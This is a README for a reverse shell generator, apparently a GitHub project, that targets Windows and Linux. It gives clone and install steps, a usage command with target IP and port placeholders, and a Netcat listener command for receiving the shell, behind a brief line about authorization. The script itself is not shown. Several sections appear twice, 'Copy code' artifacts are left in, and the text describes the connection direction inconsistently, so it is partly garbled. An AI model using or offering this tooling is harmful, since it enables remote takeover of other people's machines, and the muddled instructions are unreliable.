# Reverse Shell Generator

A Python script for creating a reverse shell on target systems, supporting both Windows and Linux platforms. Use responsibly and with proper authorization.

## Getting Started

These instructions will help you get a copy of the project up and running on your local machine.

### Prerequisites

To run this script, you will need:

- Python 3.x
- `psutil` library
- A target machine to run the reverse shell on

### Installation

1. Clone the repository:

   ```bash
   git clone https://github.com/huho-0/Strike/

2. Change into the project directory:
    ```bash
   cd strike

#Configuration

No specific configuration is required for this script. However, you need to specify the target IP and port using command-line arguments.


## Getting Started

These instructions will help you get a copy of the project up and running on your local machine.

### Prerequisites

To run this script, you will need:

- **Python 3.x**
- **psutil** library
- A target machine to run the reverse shell on

### Installation

1. Clone the repository:

   ```bash
   git clone https://github.com/huho-0/Strike/
Change into the project directory:

bash
Copy code
cd reverse-shell-generator
Install the required dependencies (in this case, psutil):

bash
Copy code
pip install psutil
Configuration
No specific configuration is required for this script. However, you need to specify the target IP and port using command-line arguments.

#Usage

To create a reverse shell, you can use this script as follows:

1. For Windows:

   ```bash
   python reverse_shell.py -ip TARGET_IP -port PORT_NUMBER
2. For Linux:

   ```bash
   python reverse_shell.py -ip TARGET_IP -port PORT_NUMBER

#How to Run the Code

To run the code, follow the usage instructions provided in the "Usage" section above.

- Make sure you have the required dependencies installed.
- Replace TARGET_IP with the IP address of the target machine.
- Replace PORT_NUMBER with the port number to connect to on the target machine.
- The script will create a reverse shell connection to the specified IP and port.

#IMPORTANT

You want to start listen to the specific port using 'Netcat' in  another device inorder to receive the reverse shell from the target
- listen through Netcat
  ```bash
  nc -nvlp port
